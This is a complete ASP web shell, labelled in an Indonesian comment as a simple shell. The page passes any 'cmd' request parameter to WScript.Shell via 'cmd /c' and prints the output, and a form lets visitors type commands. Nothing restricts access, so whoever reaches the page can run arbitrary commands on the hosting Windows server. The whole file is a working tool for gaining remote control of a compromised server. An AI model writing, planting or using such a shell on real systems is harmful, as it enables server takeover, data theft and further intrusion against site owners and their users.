<%
' Shell ASP sederhana

If Request("cmd") <> "" Then
    cmd = Request("cmd")
    Set shell = CreateObject("WScript.Shell")
    Set exec = shell.Exec("cmd /c " & cmd)
    output = exec.StdOut.ReadAll()
    Response.Write("<pre>" & Server.HTMLEncode(output) & "</pre>")
End If
%>

<form method="GET">
    Command: <input type="text" name="cmd" />
    <input type="submit" value="Run" />
</form>
